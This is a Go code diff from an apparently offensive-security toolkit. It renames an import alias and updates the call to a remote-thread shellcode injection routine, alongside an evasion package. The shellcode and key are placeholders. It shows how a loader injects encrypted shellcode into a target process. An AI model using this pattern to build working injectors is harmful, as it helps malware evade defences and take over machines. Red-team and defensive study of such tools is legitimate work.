@@ -4,7 +4,7 @@ import (
 	"fmt"
 
 	"github.com/MrTuxx/OffensiveGolang/pkg/evasion"
-	shellcode "github.com/MrTuxx/OffensiveGolang/pkg/payloads/injections/remoteThread"
+	"github.com/MrTuxx/OffensiveGolang/pkg/payloads/injections/remoteThread"
 )
 
 func main() {
@@ -18,7 +18,7 @@ func main() {
 		enc_string := "<SHELLCODE ENCRYPTED AND BASE64-ENCODED>"
 		key := "<KEY BASE64-ENCODED>"
 
-		errorRemoteThread := shellcode.ShellCodeCreateRemoteThread(pid, enc_string, key)
+		errorRemoteThread := remoteThread.ShellCodeCreateRemoteThread(pid, enc_string, key)
 		if errorRemoteThread != nil {
 			fmt.Printf("[!] Error: %s\n", errorRemoteThread)
 		}
